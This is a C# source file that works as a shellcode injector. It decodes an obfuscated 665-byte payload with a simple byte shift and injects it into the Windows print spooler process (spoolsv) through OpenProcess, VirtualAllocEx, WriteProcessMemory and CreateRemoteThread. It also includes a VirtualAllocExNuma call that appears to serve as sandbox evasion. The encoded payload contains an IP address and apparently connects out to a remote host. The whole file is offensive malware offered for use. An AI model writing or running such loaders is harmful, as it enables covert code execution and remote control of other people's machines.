﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Threading;
using System.Net;
using System.Runtime.InteropServices;

namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        [DllImport("kernel32")] private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr param, Int32 dwCreationFlags, ref IntPtr lpThreadId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        [DllImport("kernel32.dll")] static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")] static extern IntPtr GetCurrentProcess();
        static void Main(string[] args)
        { 
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);

            if (mem == null)

            {

                return;
            }

            byte[] buf = new byte[665] { 0x01, 0x4d, 0x88, 0xe9, 0xf5, 0xed, 0xd1, 0x05, 0x05, 0x05, 0x46, 0x56, 0x46, 0x55, 0x57, 0x4d, 0x36, 0xd7, 0x6a, 0x4d, 0x90, 0x57, 0x65, 0x4d, 0x90, 0x57, 0x1d, 0x56, 0x5b, 0x4d, 0x90, 0x57, 0x25, 0x52, 0x36, 0xce, 0x4d, 0x14, 0xbc, 0x4f, 0x4f, 0x4d, 0x90, 0x77, 0x55, 0x4d, 0x36, 0xc5, 0xb1, 0x41, 0x66, 0x81, 0x07, 0x31, 0x25, 0x46, 0xc6, 0xce, 0x12, 0x46, 0x06, 0xc6, 0xe7, 0xf2, 0x57, 0x4d, 0x90, 0x57, 0x25, 0x46, 0x56, 0x90, 0x47, 0x41, 0x4d, 0x06, 0xd5, 0x6b, 0x86, 0x7d, 0x1d, 0x10, 0x07, 0x14, 0x8a, 0x77, 0x05, 0x05, 0x05, 0x90, 0x85, 0x8d, 0x05, 0x05, 0x05, 0x4d, 0x8a, 0xc5, 0x79, 0x6c, 0x4d, 0x06, 0xd5, 0x55, 0x49, 0x90, 0x45, 0x25, 0x90, 0x4d, 0x1d, 0x4e, 0x06, 0xd5, 0xe8, 0x5b, 0x52, 0x36, 0xce, 0x4d, 0x04, 0xce, 0x46, 0x90, 0x39, 0x8d, 0x4d, 0x06, 0xdb, 0x4d, 0x36, 0xc5, 0xb1, 0x46, 0xc6, 0xce, 0x12, 0x46, 0x06, 0xc6, 0x3d, 0xe5, 0x7a, 0xf6, 0x51, 0x08, 0x51, 0x29, 0x0d, 0x4a, 0x3e, 0xd6, 0x7a, 0xdd, 0x5d, 0x49, 0x90, 0x45, 0x29, 0x4e, 0x06, 0xd5, 0x6b, 0x46, 0x90, 0x11, 0x4d, 0x49, 0x90, 0x45, 0x21, 0x4e, 0x06, 0xd5, 0x46, 0x90, 0x09, 0x8d, 0x46, 0x5d, 0x46, 0x5d, 0x4d, 0x06, 0xd5, 0x63, 0x5e, 0x5f, 0x46, 0x5d, 0x46, 0x5e, 0x46, 0x5f, 0x4d, 0x88, 0xf1, 0x25, 0x46, 0x57, 0x04, 0xe5, 0x5d, 0x46, 0x5e, 0x5f, 0x4d, 0x90, 0x17, 0xee, 0x50, 0x04, 0x04, 0x04, 0x62, 0x4d, 0x36, 0xe0, 0x58, 0x4e, 0xc3, 0x7c, 0x6e, 0x73, 0x6e, 0x73, 0x6a, 0x79, 0x05, 0x46, 0x5b, 0x4d, 0x8e, 0xe6, 0x4e, 0xcc, 0xc7, 0x51, 0x7c, 0x2b, 0x0c, 0x04, 0xda, 0x58, 0x58, 0x4d, 0x8e, 0xe6, 0x58, 0x5f, 0x52, 0x36, 0xc5, 0x52, 0x36, 0xce, 0x58, 0x58, 0x4e, 0xbf, 0x3f, 0x5b, 0x7e, 0xac, 0x05, 0x05, 0x05, 0x05, 0x04, 0xda, 0xed, 0x13, 0x05, 0x05, 0x05, 0x36, 0x3e, 0x37, 0x33, 0x36, 0x3b, 0x3d, 0x33, 0x39, 0x3e, 0x33, 0x3c, 0x3a, 0x05, 0x5f, 0x4d, 0x8e, 0xc6, 0x4e, 0xcc, 0xc5, 0xc0, 0x06, 0x05, 0x05, 0x52, 0x36, 0xce, 0x58, 0x58, 0x6f, 0x08, 0x58, 0x4e, 0xbf, 0x5c, 0x8e, 0xa4, 0xcb, 0x05, 0x05, 0x05, 0x05, 0x04, 0xda, 0xed, 0x75, 0x05, 0x05, 0x05, 0x34, 0x55, 0x73, 0x69, 0x4d, 0x50, 0x37, 0x51, 0x64, 0x6a, 0x67, 0x51, 0x7f, 0x4d, 0x64, 0x4e, 0x69, 0x70, 0x76, 0x4a, 0x66, 0x73, 0x6c, 0x5d, 0x36, 0x7b, 0x36, 0x7b, 0x54, 0x7a, 0x73, 0x71, 0x4b, 0x7e, 0x6b, 0x64, 0x3d, 0x75, 0x3e, 0x59, 0x5f, 0x76, 0x72, 0x6d, 0x5f, 0x71, 0x4f, 0x53, 0x67, 0x71, 0x5c, 0x7b, 0x76, 0x6a, 0x4e, 0x5e, 0x74, 0x3c, 0x51, 0x36, 0x6b, 0x6a, 0x5e, 0x3c, 0x68, 0x7d, 0x72, 0x72, 0x4b, 0x5c, 0x73, 0x69, 0x7b, 0x54, 0x55, 0x51, 0x57, 0x5d, 0x57, 0x6e, 0x5b, 0x5e, 0x36, 0x6a, 0x5f, 0x56, 0x6c, 0x54, 0x71, 0x59, 0x5b, 0x6d, 0x76, 0x52, 0x67, 0x4c, 0x53, 0x7e, 0x37, 0x32, 0x68, 0x5d, 0x5b, 0x3c, 0x35, 0x4a, 0x6a, 0x69, 0x73, 0x38, 0x49, 0x05, 0x4d, 0x8e, 0xc6, 0x58, 0x5f, 0x46, 0x5d, 0x52, 0x36, 0xce, 0x58, 0x4d, 0xbd, 0x05, 0x37, 0xad, 0x89, 0x05, 0x05, 0x05, 0x05, 0x55, 0x58, 0x58, 0x4e, 0xcc, 0xc7, 0xf0, 0x5a, 0x33, 0x40, 0x04, 0xda, 0x4d, 0x8e, 0xcb, 0x6f, 0x0f, 0x64, 0x4d, 0x8e, 0xf6, 0x6f, 0x24, 0x5f, 0x57, 0x6d, 0x85, 0x38, 0x05, 0x05, 0x4e, 0x8e, 0xe5, 0x6f, 0x09, 0x46, 0x5e, 0x4e, 0xbf, 0x7a, 0x4b, 0xa3, 0x8b, 0x05, 0x05, 0x05, 0x05, 0x04, 0xda, 0x52, 0x36, 0xc5, 0x58, 0x5f, 0x4d, 0x8e, 0xf6, 0x52, 0x36, 0xce, 0x52, 0x36, 0xce, 0x58, 0x58, 0x4e, 0xcc, 0xc7, 0x32, 0x0b, 0x1d, 0x80, 0x04, 0xda, 0x8a, 0xc5, 0x7a, 0x24, 0x4d, 0xcc, 0xc6, 0x8d, 0x18, 0x05, 0x05, 0x4e, 0xbf, 0x49, 0xf5, 0x3a, 0xe5, 0x05, 0x05, 0x05, 0x05, 0x04, 0xda, 0x4d, 0x04, 0xd4, 0x79, 0x07, 0xf0, 0xaf, 0xed, 0x5a, 0x05, 0x05, 0x05, 0x58, 0x5e, 0x6f, 0x45, 0x5f, 0x4e, 0x8e, 0xd6, 0xc6, 0xe7, 0x15, 0x4e, 0xcc, 0xc5, 0x05, 0x15, 0x05, 0x05, 0x4e, 0xbf, 0x5d, 0xa9, 0x58, 0xea, 0x05, 0x05, 0x05, 0x05, 0x04, 0xda, 0x4d, 0x98, 0x58, 0x58, 0x4d, 0x8e, 0xec, 0x4d, 0x8e, 0xf6, 0x4d, 0x8e, 0xdf, 0x4e, 0xcc, 0xc5, 0x05, 0x25, 0x05, 0x05, 0x4e, 0x8e, 0xfe, 0x4e, 0xbf, 0x17, 0x9b, 0x8e, 0xe7, 0x05, 0x05, 0x05, 0x05, 0x04, 0xda, 0x4d, 0x88, 0xc9, 0x25, 0x8a, 0xc5, 0x79, 0xb7, 0x6b, 0x90, 0x0c, 0x4d, 0x06, 0xc8, 0x8a, 0xc5, 0x7a, 0xd7, 0x5d, 0xc8, 0x5d, 0x6f, 0x05, 0x5e, 0x4e, 0xcc, 0xc7, 0xf5, 0xba, 0xa7, 0x5b, 0x04, 0xda };

            for (int i = 0; i < buf.Length; i++)

            {

                buf[i] = (byte)(((uint)buf[i] - 5) & 0xFF);

            }

            int size = buf.Length;

            Process[] expProc = Process.GetProcessesByName("spoolsv"); int pid = expProc[0].Id;

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            IntPtr outSize;

            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}
